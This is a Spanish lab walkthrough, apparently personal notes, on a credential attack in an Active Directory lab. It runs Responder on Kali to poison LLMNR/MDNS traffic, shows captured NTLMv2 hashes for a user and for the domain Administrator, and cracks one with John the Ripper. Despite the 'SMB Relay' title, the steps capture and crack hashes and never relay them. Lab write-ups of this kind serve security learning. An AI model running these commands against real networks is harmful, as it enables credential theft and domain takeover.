Un ataque SMB Relay (o retransmisión SMB) es una técnica de ciberseguridad del tipo Man-in-the-Middle (intermediario) en la que un atacante intercepta las solicitudes de autenticación de red de un usuario legítimo y las redirige (o "retransmite") hacia otro servidor o sistema dentro de la misma red.

A diferencia de otros métodos, el atacante no necesita descifrar la contraseña ni conocerla en texto plano; simplemente aprovecha el proceso de autenticación en curso para hacerse pasar por la víctima.

Para hacer este ataque, tenemos que tener el DC y la máquina cliente conectadas y bien configuradas dentro del dominio; por tanto una vez hecho esto vamos a abrir el Kali Linux y nos ubicamos a la ubicación de una herramienta que se llama responder:
```bash
(physco@kali)-[/usr/share/responder]
$ ls
certs       odict.py    __pycache__   Responder.py  settings.py
DumpHash.py packets.py  Report.py     script        tools
files       poisoners   Responder.conf servers       utils.py
```
Lo ejecutamos con estos parámetros:
```bash
(root@kali)-[/usr/share/responder]
# python3 Responder.py -I eth0 -w -d
```
Y se pone a envenenar el tráfico:
```bash
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name FRPARITCSPRNP01
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [LLMNR] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name GlobalMPS.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS.local
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name GlobalMPS.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name GlobalMPS.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [DCE-RPC Mapper] Redirected fe80::95d4:1023:d99:fa6to WINSPOOL auth server.
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name FRPARITCSPRNP01
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [LLMNR] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01.local
[*] [LLMNR] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name FRPARITCSPRNP01
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name FRPARITCSPRNP01
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.5 for name GlobalMPS
[*] [MDNS] Poisoned answer sent to fe80::95d4:1023:d99:fa6 for name GlobalMPS.local
```
Y ahora en este punto, si desde la máquina cliente se intenta acceder a un recurso compartido que no existe, vamos a obtener el hash con las credenciales de dicha máquina.
![[Pasted image 20230129170707.png]]
Y una vez hecho este intento, en la máquina Kali Linux desde el responder habremos interceptado el hash con las credenciales de este usuario:
```bash
[*] [MDNS] Poisoned answer sent to 192.168.0.7 for name SQLServer
[*] [LLMNR] Poisoned answer sent to fe80::be7d:1530:7a18:45c7 for name SQLServer
[*] [LLMNR] Poisoned answer sent to 192.168.0.7 for name SQLServer
[SMB] NTLMv2-SSP Client   : fe80::be7d:1530:7a18:45c7
[SMB] NTLMv2-SSP Username : ADServer\physco
[SMB] NTLMv2-SSP Hash     : physco::ADServer:e1a5e56359b2f2d1:E13BDC7B21979AAA614C5758
537BF036:010100000000000080787F480334D901200E931ED9697BB70000000200080035003400460034000100
1E00570049004E002D00500050003400530044005200340046003500340034002E004C004F00430041004C0000000005
0003400530044005200340036004800350058002E0035003400460034002E004C004F00430041004C000300140035
003400460034002E004C004F00430041004C000500140051004E003400460034002E004C004F00430041004C000700080
080787F480334D901060004000200000008003000300000000000000020000008EA884C82D7749F1357
4FC949296B45F34573A76FC6A7741D3ECB92276E7E5C0A00100000000000000000000000000000009001C006
3006900660073002F00530051004C00530065007200760065007200000000000000
[*] [MDNS] Poisoned answer sent to 192.168.0.7   for name SQLServer.local
[*] [LLMNR] Poisoned answer sent to fe80::be7d:1530:7a18:45c7 for name SQLServer
[*] [MDNS] Poisoned answer sent to fe80::be7d:1530:7a18:45c7 for name SQLServer.local
```
Y también podemos interceptar de misma forma el hash del usuario administrador si esta petición se hace desde el DC:

```bash
[*] [MDNS] Poisoned answer sent to fe80::b3ae:d583:f91c:95ed for name SQLServer.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.8 for name SQLServer
[SMB] NTLMv2-SSP Client   : fe80::b3ae:d583:f91c:95ed
[SMB] NTLMv2-SSP Username : ADServer\Administrador
[SMB] NTLMv2-SSP Hash     : Administrador::physco:d93eb296cd56014d:8B207AEC577328FA0521
98D1DE1D4E2B:01010000000000003C767B0434D9010581E0DFFCF8E25900000020008003500340046004300
01001E00570049004E002D004D00390042004A0058003500360057004C00560057004003400570049004E002D004
D00390042004A0058003500360057004C00560057002E0051004E003600430042004F00430041004C00030014
0051004E003600430042004F00430041004C000500140051004E003600430042004F00430041004C0007000400
00800003C767B0434D90106000400020000000800300030000000000000003000000C31BC29B5A8C1F2E
A0392263D78A8184428F491B778CF99771FD368B5D637F60A0010000000000000000000000000000009001
C0063006900660073002F00530051004C00530065007200760065007200000000000000
[*] [MDNS] Poisoned answer sent to 192.168.0.8   for name SQLServer.local
[*] [LLMNR] Poisoned answer sent to fe80::b3ae:d583:f91c:95ed for name SQLServer
[*] [LLMNR] Poisoned answer sent to 192.168.0.8 for name SQLServer
[*] [MDNS] Poisoned answer sent to fe80::b3ae:d583:f91c:95ed for name SQLServer.local
[*] [LLMNR] Poisoned answer sent to 192.168.0.8 for name SQLServer
```
Y ahora con John the Ripper podemos tratar de hacer un ataque de fuerza bruta a cualquiera de estos hashes; y si la password es débil, va a funcionar correctamente como en este caso:[[John The Ripper]]
```bash
physco@kali)-[~/Escritorio]
$ john --wordlist=rockyou.txt clave_pinguino.txt
Created directory: /home/physco/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1          (physco)
1g 0:00:00 DONE (2023-01-29 17:17) 11.11g/s 39111p/s 39111c/s 39111C/s fotos..dracula
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

